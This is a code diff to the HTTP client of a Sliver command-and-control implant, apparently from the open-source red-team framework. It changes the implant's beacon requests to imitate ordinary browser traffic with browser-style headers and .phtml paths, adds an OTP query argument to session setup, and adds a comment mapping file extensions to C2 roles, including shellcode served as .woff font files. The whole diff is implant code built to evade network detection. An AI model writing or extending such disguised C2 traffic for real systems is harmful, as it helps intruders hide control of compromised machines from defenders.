@@ -59,10 +59,11 @@ import (
 )
 
 const (
-	defaultUserAgent  = "{{GenerateUserAgent}}"
+	userAgent         = "{{GenerateUserAgent}}"
 	defaultNetTimeout = time.Second * 60
 	defaultReqTimeout = time.Second * 60 // Long polling, we want a large timeout
 	nonceQueryArgs    = "abcdefghijklmnopqrstuvwxyz_"
+	acceptHeaderValue = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"
 )
 
 func init() {
@@ -128,8 +129,14 @@ func (s *SliverHTTPClient) SessionInit() error {
 
 func (s *SliverHTTPClient) newHTTPRequest(method string, uri *url.URL, body io.Reader) *http.Request {
 	req, _ := http.NewRequest(method, uri.String(), body)
-	req.Header.Set("User-Agent", defaultUserAgent)
-	req.Header.Set("Accept-Language", "en-US")
+	req.Header.Set("User-Agent", userAgent)
+	if method == http.MethodGet {
+		req.Header.Set("Accept-Language", "en-US,en;q=0.9")
+		req.Header.Set("Accept", acceptHeaderValue)
+	}
+	if uri.Scheme == "http" {
+		req.Header.Set("Upgrade-Insecure-Requests", "1")
+	}
 	return req
 }
 
@@ -157,7 +164,7 @@ func (s *SliverHTTPClient) otpQueryArgument(uri *url.URL, value string) *url.URL
 	for i := 0; i < insecureRand.Intn(3); i++ {
 		index := insecureRand.Intn(len(value))
 		char := string(nonceQueryArgs[insecureRand.Intn(len(nonceQueryArgs))])
-		value = value[:index] + char + value[index+1:]
+		value = value[:index] + char + value[index:]
 	}
 	values.Add(string([]byte{key1, key2}), value)
 	uri.RawQuery = values.Encode()
@@ -224,8 +231,10 @@ func (s *SliverHTTPClient) getSessionID(sessionInit []byte) error {
 	payload := encoder.Encode(sessionInit)
 	reqBody := bytes.NewReader(payload) // Already RSA encrypted
 
-	uri := s.pngURL()
+	uri := s.phtmlURL()
 	s.nonceQueryArgument(uri, nonce)
+	otpCode := getOTPCode()
+	s.otpQueryArgument(uri, otpCode)
 	req := s.newHTTPRequest(http.MethodPost, uri, reqBody)
 	// {{if .Config.Debug}}
 	log.Printf("[http] POST -> %s", uri)
@@ -338,6 +347,14 @@ func (s *SliverHTTPClient) pathJoinURL(segments []string) string {
 	return strings.Join(segments, "/")
 }
 
+// Procedural C2
+// ===============
+// .txt = rsakey
+// .php = start / session
+// .js = poll
+// .png = stop
+// .woff = sliver shellcode
+
 func (s *SliverHTTPClient) jsURL() *url.URL {
 	curl, _ := url.Parse(s.Origin)
 
@@ -387,6 +404,12 @@ func (s *SliverHTTPClient) phpURL() *url.URL {
 		// {{end}}
 	}
 	curl.Path = s.pathJoinURL(s.randomPath(segments, filenames))
+	return curl
+}
+
+func (s *SliverHTTPClient) phtmlURL() *url.URL {
+	curl := s.phpURL()
+	curl, _ = url.Parse(strings.Replace(curl.String(), ".php", ".phtml", 1))
 	return curl
 }
 
